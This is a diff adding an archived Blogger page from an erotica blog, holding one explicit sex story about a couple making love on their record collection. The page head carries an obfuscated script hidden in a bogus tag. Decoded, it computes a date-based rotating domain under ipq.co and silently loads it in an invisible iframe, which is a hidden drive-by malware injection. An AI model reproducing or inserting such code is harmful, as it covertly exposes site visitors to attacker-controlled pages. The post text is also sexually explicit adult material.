@@ -1,0 +1,571 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><nHreqmUJzNzAPcSK><script>eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,77,111,110,116,104,78,117,109,40,97,98,98,77,111,110,116,104,41,32,123,32,32,32,32,118,97,114,32,97,114,114,77,111,110,32,61,32,110,101,119,32,65,114,114,97,121,40,32,34,74,97,110,34,44,32,34,70,101,98,34,44,32,34,77,97,114,34,44,32,34,65,112,114,34,44,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,77,97,121,34,44,32,34,74,117,110,34,44,32,34,74,117,108,34,44,32,34,65,32,117,103,34,44,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,34,83,101,112,34,44,32,34,79,99,116,34,44,32,34,78,111,118,34,44,32,34,68,101,99,34,32,32,32,32,41,59,32,32,32,32,118,97,114,32,105,59,32,32,32,32,102,111,114,32,40,105,32,61,32,48,59,32,105,32,60,32,97,114,114,77,111,110,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,32,32,32,32,32,32,32,32,105,102,32,40,97,98,98,77,111,110,116,104,32,61,61,32,97,114,114,77,111,110,91,105,93,41,32,123,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,105,59,32,32,32,32,32,32,32,32,125,32,32,32,32,125,32,32,32,32,114,101,116,117,114,110,32,45,49,59,125,102,117,110,99,116,105,111,110,32,100,97,116,101,85,84,67,100,97,116,101,84,111,68,97,116,101,40,100,97,116,101,83,116,114,105,110,103,41,32,123,32,32,32,32,118,97,114,32,97,114,114,68,97,116,101,83,116,114,32,61,32,100,97,116,101,83,116,114,105,110,103,46,115,112,108,105,116,40,34,32,34,41,59,32,32,32,32,118,97,114,32,109,111,110,116,104,32,61,32,103,101,116,77,111,110,116,104,78,117,109,40,97,114,114,68,97,116,101,83,116,114,91,50,93,41,59,32,32,32,32,118,97,114,32,100,97,121,32,61,32,97,114,114,68,97,116,101,83,116,114,91,49,93,59,32,32,32,32,118,97,114,32,121,101,97,114,32,61,32,97,114,114,68,97,116,101,83,116,114,91,51,93,59,32,32,32,32,118,97,114,32,104,111,117,114,32,61,32,97,114,114,68,97,116,101,83,116,114,91,52,93,46,115,117,98,115,116,114,40,48,44,32,50,41,59,32,32,32,32,118,97,114,32,109,105,110,117,116,101,32,61,32,97,114,114,68,97,116,101,83,116,114,91,52,93,46,115,117,98,115,116,114,40,51,44,32,50,41,59,32,32,32,32,118,97,114,32,115,101,99,111,110,100,32,61,32,97,114,114,68,97,116,101,83,116,114,91,52,93,46,115,117,98,115,116,114,40,54,44,32,50,41,59,32,32,32,32,114,101,116,117,114,110,32,110,101,119,32,68,97,116,101,40,121,101,97,114,44,32,109,111,110,116,104,44,32,100,97,121,44,32,104,111,117,114,44,32,109,105,110,117,116,101,44,32,115,101,99,111,110,100,41,59,125,102,117,110,99,116,105,111,110,32,103,101,116,95,100,111,109,97,105,110,40,121,44,32,109,44,32,100,44,32,104,44,32,112,114,101,102,105,120,44,32,112,111,115,116,102,105,120,41,32,123,32,32,32,32,118,97,114,32,99,104,97,114,115,32,61,32,34,107,50,112,100,104,52,113,119,101,106,57,106,50,114,111,98,53,49,104,111,108,110,108,51,112,114,120,98,107,119,104,102,112,53,101,97,34,59,32,32,32,32,117,114,108,32,61,32,110,101,119,32,83,116,114,105,110,103,40,41,59,32,32,32,32,102,111,114,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,52,59,32,105,32,43,43,41,123,32,32,32,32,32,32,32,32,116,32,61,32,105,59,32,108,32,61,32,99,104,97,114,115,46,108,101,110,103,116,104,59,32,32,32,32,32,32,32,32,116,32,61,32,40,116,32,43,32,104,41,32,37,32,108,59,32,117,114,108,32,43,61,32,99,104,97,114,115,46,115,117,98,115,116,114,40,116,44,32,49,41,59,32,32,32,32,32,32,32,32,116,32,61,32,40,116,32,43,32,100,41,32,37,32,108,59,32,117,114,108,32,43,61,32,99,104,97,114,115,46,115,117,98,115,116,114,40,116,44,32,49,41,59,32,32,32,32,32,32,32,32,116,32,61,32,40,116,32,43,32,109,41,32,37,32,108,59,32,117,114,108,32,43,61,32,99,104,97,114,115,46,115,117,98,115,116,114,40,116,44,32,49,41,59,32,32,32,32,32,32,32,32,116,32,61,32,40,116,32,43,32,121,41,32,37,32,108,59,32,117,114,108,32,43,61,32,99,104,97,114,115,46,115,117,98,115,116,114,40,116,44,32,49,41,59,32,32,32,32,125,32,32,32,32,114,101,116,117,114,110,32,40,112,114,101,102,105,120,32,43,32,117,114,108,32,43,32,112,111,115,116,102,105,120,41,46,116,111,76,111,119,101,114,67,97,115,101,40,41,59,125,102,117,110,99,116,105,111,110,32,103,101,116,95,99,117,114,114,101,110,116,95,100,111,109,97,105,110,40,112,114,101,102,105,120,44,32,112,111,115,116,102,105,120,41,32,123,32,32,32,32,118,97,114,32,100,116,32,61,32,110,101,119,32,68,97,116,101,40,41,59,32,32,32,32,118,97,114,32,121,32,61,32,100,116,46,103,101,116,85,84,67,70,117,108,108,89,101,97,114,40,41,59,32,32,32,32,118,97,114,32,109,32,61,32,100,116,46,103,101,116,77,111,110,116,104,40,41,59,32,32,32,32,118,97,114,32,100,32,61,32,100,116,46,103,101,116,85,84,67,68,97,116,101,40,41,59,32,32,32,32,118,97,114,32,104,32,61,32,100,116,46,103,101,116,85,84,67,72,111,117,114,115,40,41,59,32,32,32,32,114,101,116,117,114,110,32,103,101,116,95,100,111,109,97,105,110,40,121,44,32,109,44,32,100,44,32,77,97,116,104,46,102,108,111,111,114,40,104,32,47,32,56,41,44,32,112,114,101,102,105,120,44,32,112,111,115,116,102,105,120,41,59,125,118,97,114,32,99,117,114,114,101,110,116,95,100,111,109,97,105,110,32,61,32,34,104,116,116,112,58,47,47,34,32,43,32,103,101,116,95,99,117,114,114,101,110,116,95,100,111,109,97,105,110,40,34,103,34,44,32,34,34,41,32,43,32,34,46,105,112,113,46,99,111,47,103,111,46,112,104,112,63,115,105,100,61,51,34,59,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,116,114,121,123,118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,116,121,108,101,46,118,105,115,105,98,105,108,105,116,121,61,34,104,105,100,100,101,110,34,59,115,46,115,116,121,108,101,46,100,105,115,112,108,97,121,61,34,110,111,110,101,34,59,115,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,115,114,99,34,44,99,117,114,114,101,110,116,95,100,111,109,97,105,110,41,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,125,99,97,116,99,104,40,101,41,123,125,125,44,53,48,48,41,59));</script></nHreqmUJzNzAPcSK>
+  <title>hipsterotica</title>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta name="MSSmartTagsPreventParsing" content="true" />
+<meta name="generator" content="Blogger" />
+<link rel="icon" type="image/vnd.microsoft.icon" href="http://www.blogger.com/favicon.ico"/>
+<link rel="alternate" type="application/atom+xml" title="hipsterotica - Atom" href="http://www.hipsterotica.com/atom.xml" />
+<link rel="alternate" type="application/rss+xml" title="hipsterotica - RSS" href="http://www.hipsterotica.com/rss.xml" />
+<link rel="service.post" type="application/atom+xml" title="hipsterotica - Atom" href="http://www.blogger.com/feeds/33572972/posts/default" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.blogger.com/rsd.g?blogID=33572972" />
+<link rel="alternate" type="application/atom+xml" title="hipsterotica - Atom" href="http://www.blogger.com/feeds/33572972/116867307874390968/comments/default" />
+ <link rel="stylesheet" type="text/css" href="http://www.blogger.com/static/v1/v-css/3727950723-blog_controls.css"/> <link rel="stylesheet" type="text/css" href="http://www.blogger.com/dyn-css/authorization.css?targetBlogID=33572972&zx=66bc986e-7ee4-469c-9637-e703ef87cc4d"/>
+
+  <style type="text/css">
+/*
+-----------------------------------------------
+Blogger Template Style
+Name: 	  Thisaway (Rose)
+Designer: Dan Rubin
+URL: 	    www.superfluousbanter.org
+Date:     29 Feb 2004
+----------------------------------------------- */
+
+
+/* global
+----------------------------------------------- */
+body {
+margin: 0;
+padding: 0;
+text-align: center;
+min-width: 760px;
+background: #ce436e url(http://www.blogblog.com/thisaway_rose/bg_body.gif) repeat-x left top;
+font-family: helvetica, arial, verdana, "trebuchet ms", sans-serif;
+color: #632035;
+}
+
+blockquote {
+margin: 0;
+padding: 0 10px 0 10px;
+border-left: 6px solid #f7d8e2;
+border-right: 6px solid #f7d8e2;
+color: #ba476b;
+}
+
+code {
+color: #ba8094;
+}
+
+hr {
+display: none;
+}
+
+
+/* layout
+----------------------------------------------- */
+@media all {
+  #wrapper {
+    margin: 0 auto;
+    width: 760px;
+    text-align: left;
+    }
+
+  #blog-header {
+    padding-bottom: 15px;
+    background: url(http://www.blogblog.com/thisaway_rose/bg_header_bottom.gif) no-repeat left bottom;
+    }
+
+  #blog-header div {
+    background: #632035 url(http://www.blogblog.com/thisaway_rose/bg_header.gif) repeat-x left bottom;
+    }
+
+  #main-wrapper {
+    position: relative;
+    width: 760px;
+    background: #f7f0e9 url(http://www.blogblog.com/thisaway_rose/bg_main_wrapper.gif) repeat-y left top;
+    }
+
+  #main-content {
+    display: inline; /* fixes a strange ie margin bug */
+    float: left;
+    margin: 0 0 0 3px;
+    padding: 0;
+    width: 483px;
+    }
+
+  #content-wrapper {
+    padding: 22px 0 0 0;
+    background: url(http://www.blogblog.com/thisaway_rose/bg_content.gif) repeat-x left top;
+    }
+  }
+@media handheld {
+  #wrapper {
+    width: 90%;
+    }
+
+  #blog-header {
+    background:none;
+    }
+
+  #blog-header div {
+    background: #632035;
+    }
+
+  #main-wrapper {
+    width: 100%;
+    background: #f7f0e9;
+    }
+
+  #main-content {
+    float: none;
+    width: 100%;
+    }
+
+  #content-wrapper {
+    background: none;
+    }
+  }
+
+.post {
+margin: 0 16px 14px 29px;
+padding: 0;
+border-bottom: 3px solid #f7d8e2;
+}
+
+#comments {
+margin: 0 16px 14px 29px;
+padding: 10px;
+border: 1px solid #f0ced8;
+background-color: #f5e4e9;
+}
+
+@media all {
+  #sidebar-wrapper {
+    display: inline; /* fixes a strange ie margin bug */
+    float: right;
+    margin: 0 3px 0 0;
+    width: 269px;
+    color: #761c37;
+    background: url(http://www.blogblog.com/thisaway_rose/bg_sidebar.gif) repeat-x left top;
+    }
+
+  #sidebar {
+    padding: 7px 11px 0 14px;
+
+    }
+
+  #blog-footer {
+    padding-top: 15px;
+    background: url(http://www.blogblog.com/thisaway_rose/bg_footer_top.gif) no-repeat left top;
+    }
+
+  #blog-footer div {
+    background: #491525 url(http://www.blogblog.com/thisaway_rose/bg_footer.gif) repeat-x left top;
+    }
+  }
+@media handheld {
+  #sidebar-wrapper {
+    float: none;
+    width: 100%;
+    background:none;
+    }
+
+  #sidebar {
+    background:none;
+    }
+
+  #blog-footer {
+    background:none;
+    }
+
+  #blog-footer div {
+    background: #491525;
+    }
+  }
+
+#profile-container {
+margin-bottom: 20px;
+}
+
+/* headings
+----------------------------------------------- */
+#blog-header h1 {
+margin: 0;
+padding: 26px 0 0 84px;
+color: #feeef3;
+font-size: 30px;
+line-height: 25px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_header.gif) no-repeat 16px 26px;
+}
+
+h2.date-header {
+margin: 0;
+padding: 0 0 0 29px;
+font-size: 10px;
+text-transform: uppercase;
+color: #c88fa2;
+background: url(http://www.blogblog.com/thisaway_rose/icon_date.gif) no-repeat 13px 0;
+}
+
+.date-header span {
+margin: 0 0 0 5px;
+padding: 0 25px 0 25px;
+background: url(http://www.blogblog.com/thisaway_rose/bg_date.gif) no-repeat 0 0;
+}
+
+h2.sidebar-title {
+padding: 1px 0 0 36px;
+font-size: 14px;
+color: #bd8095;
+background: url(http://www.blogblog.com/thisaway_rose/icon_sidebar_heading.gif) no-repeat 0 45%;
+}
+
+#profile-container h2.sidebar-title {
+color: #95526a;
+background: url(http://www.blogblog.com/thisaway_rose/icon_sidebar_profileheading.gif) no-repeat 0 45%;
+}
+
+.post h3.post-title {
+margin: 13px 0 0 0;
+padding: 0;
+font-size: 18px;
+color: #ba476b;
+}
+
+#comments h4 {
+margin-top: 0;
+font-size: 16px;
+}
+
+
+/* text
+----------------------------------------------- */
+#blog-header p {
+margin: 0;
+padding: 7px 16px 0 84px;
+color: #feeef3;
+font-size: 10px;
+font-weight: bold;
+line-height: 14px;
+}
+
+.post-body div {
+font-size: 13px;
+line-height: 18px;
+margin: 0;
+height: 1%;
+overflow: visible;
+}
+
+.post-body blockquote {
+margin: 10px 0px;
+}
+
+p.post-footer {
+font-size: 11px;
+color: #bd8095;
+text-align: right;
+}
+
+p.post-footer em {
+display: block;
+float: left;
+text-align: left;
+font-style: normal;
+}
+
+p.comment-data {
+font-size: 12px;
+}
+
+.comment-body p {
+font-size: 12px;
+line-height: 17px;
+}
+
+.deleted-comment {
+  font-style:italic;
+  color:gray;
+  }
+
+#sidebar p {
+font-size: 12px;
+line-height: 17px;
+margin-bottom: 20px;
+}
+
+#sidebar p.profile-textblock {
+clear: both;
+margin-bottom: 10px;
+}
+
+.profile-link {
+padding: 0 0 0 17px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_profile.gif) no-repeat 0 0;
+}
+
+p#powered-by {
+margin: 0;
+padding: 0;
+}
+
+#blog-footer p {
+margin: 0;
+padding: 0 0 15px 55px;
+color: #feeef3;
+font-size: 10px;
+line-height: 14px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_footer.gif) no-repeat 16px 0;
+}
+
+
+/* lists
+----------------------------------------------- */
+.profile-data {
+font-size: 13px;
+line-height: 17px;
+}
+
+.post ul {
+padding-left: 32px;
+list-style-type: none;
+font-size: 13px;
+line-height: 18px;
+}
+
+.post li {
+padding: 0 0 4px 17px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_list_item.gif) no-repeat 0 3px;
+}
+
+#comments ul {
+margin: 0;
+padding: 0;
+list-style-type: none;
+}
+
+#comments li {
+padding: 0 0 1px 17px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_comment.gif) no-repeat 0 3px;
+}
+
+#sidebar ul {
+margin: 0 0 20px 0;
+padding: 0;
+list-style-type: none;
+font-size: 12px;
+line-height: 14px;
+}
+
+#sidebar li {
+padding: 0 0 4px 17px;
+background: url(http://www.blogblog.com/thisaway_rose/icon_list_item.gif) no-repeat 0 3px;
+}
+
+
+/* links
+----------------------------------------------- */
+a {
+color: #bf277e;
+font-weight: bold;
+}
+
+a:hover {
+color: #96095a;
+}
+
+a.comment-link {
+/* ie5.0/win doesn't apply padding to inline elements,
+   so we hide these two declarations from it */
+background/* */:/**/url(http://www.blogblog.com/thisaway_rose/icon_comment.gif) no-repeat 0 45%;
+padding-left: 14px;
+}
+
+html>body a.comment-link {
+/* respecified, for ie5/mac's benefit */
+background: url(http://www.blogblog.com/thisaway_rose/icon_comment.gif) no-repeat 0 45%;
+padding-left: 14px;
+}
+
+#sidebar ul a {
+color: #e25984;
+}
+
+#sidebar ul a:hover {
+color: #b02c56;
+}
+
+#powered-by a img {
+border: none;
+}
+
+#blog-header h1 a {
+color: #feeef3;
+text-decoration: none;
+}
+
+#blog-header h1 a:hover {
+color: #d9b4c1;
+}
+
+h3.post-title a {
+color: #ba476b;
+text-decoration: none;
+}
+
+h3.post-title a:hover {
+color: #902245;
+}
+
+
+/* miscellaneous
+----------------------------------------------- */
+.post-photo {
+padding: 3px;
+border: 1px solid #ebbdcc;
+}
+
+.profile-img {
+display: inline;
+}
+
+.profile-img img {
+float: left;
+margin: 0 10px 5px 0;
+padding: 3px;
+border: 1px solid #ebbdcc;
+}
+
+.profile-data strong {
+display: block;
+}
+
+.clear {
+clear: both;
+line-height: 0;
+height: 0;
+} 
+  </style>
+
+
+</head>
+
+<body>
+
+<!-- #wrapper for centering the layout -->
+<div id="wrapper">
+
+<!-- Blog Header -->
+<div id="blog-header"><div>
+  	<h1>
+    <a href="http://www.hipsterotica.com/">
+	hipsterotica
+	</a>
+  </h1>
+  	<p></p>
+</div></div>
+
+<!-- Begin #main-wrapper - surrounds the #main-content and #sidebar divs for positioning -->
+<div id="main-wrapper">
+
+<!-- Begin #main - This div contains the main-column blog content -->
+<div id="main-content">
+<!-- Begin #content-wrapper -->
+<div id="content-wrapper">
+
+<div class='adsense' style='text-align:center; padding: 0px 3px 0.5em 3px;'>
+
+
+</script>
+
+
+</div>
+
+
+    
+  <h2 class="date-header">Wednesday, January 10, 2007</h2>
+  
+  
+  
+  <!-- Begin .post -->
+  <div class="post"><a name="116867307874390968"></a>
+  
+    
+    
+    <div class="post-body">
+    
+      <div>
+      <div style="clear:both;"></div>We arrange records on the floor-7 across and 7 down. I hate your picks and you hate mine despite the similiarity of them all. I’m the Courtney Taylor to your Anton Newcomb and so to compromise we make a pact to listen to whatever album I cum on—regardless of whose pick it was. <br /><br />We lay across the records and start to kiss.  <a href="http://www.malajube.com">Malajube</a> is blaring on your iMac—I have no idea what they are saying but I fucking love it when you slip your fingers inside me during <em>Montreal -40 degrees Celsius</em>. And by the time <em>La Monogamie </em>comes on I’m sucking you off as you pull on my long brown hair. <br /><br />I become so wet and even dizzy-- like that day last summer when I found out I won the ebay auction for that Pavement “Slanted and Enchanted” Vinyl LP on my first bid.  I lay down as your hard cock slides inside me to the rhythm of <em>Casse-Cou</em>. Three minutes later I’m cuming harder than the time you fucked me on your pork pie drum set. <br /><br />I pull out the record from under me—it’s Kraftwerk “Computer World”. I win.<div style="clear:both; padding-bottom:0.25em"></div>
+      </div>
+    
+    </div>
+    
+    <p class="post-footer">
+    	<em>posted by one of us ;) @ <a href="http://www.hipsterotica.com/2007/01/we-arrange-records-on-floor-7-across.html" title="permanent link">6:14 PM</a></em> &nbsp;
+    	 <span class="item-control blog-admin pid-896552934"><a style="border:none;" href="http://www.blogger.com/post-edit.g?blogID=33572972&postID=116867307874390968" title="Edit Post"><img class="icon-action" alt="" src="http://www.blogger.com:80/img/icon18_edit_allbkg.gif" height="18" width="18"></a></span>
+    </p>
+  
+  </div>
+  <!-- End .post -->
+  
+  
+  <!-- Begin #comments -->
+ 
+
+  <div id="comments">
+
+	<a name="comments"></a>
+    
+    <h4>0 Comments:</h4>
+    
+    <ul>
+      
+    </ul>
+	
+	<p class="comment-data">
+    <a class="comment-link" href="https://www.blogger.com/comment.g?blogID=33572972&postID=116867307874390968">Post a Comment</a>
+    </p>
+  
+  	    
+    
+
+
+	
+	<p class="comment-data">
+	<a href="http://www.hipsterotica.com/">&lt;&lt; Home</a>
+    </p>
+    </div>
+
+
+  <!-- End #comments -->
+
+
+
+</div>
+<!-- End #content-wrapper -->
+
+</div>
+<!-- End #main-content -->
+
+
+<!-- Begin #sidebar-wrapper -->
+<!-- End #sidebar -->
+</div>
+<!-- End #sidebar-wrapper -->
+
+<div class="clear">&nbsp;</div>
+</div>
+<!-- End #main-wrapper -->
+
+<div id="blog-footer"><div>
+	<p><!-- If you'd like, you could place footer information here. -->&nbsp;</p>
+</div></div>
+
+</div>
+<!-- End #wrapper -->
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
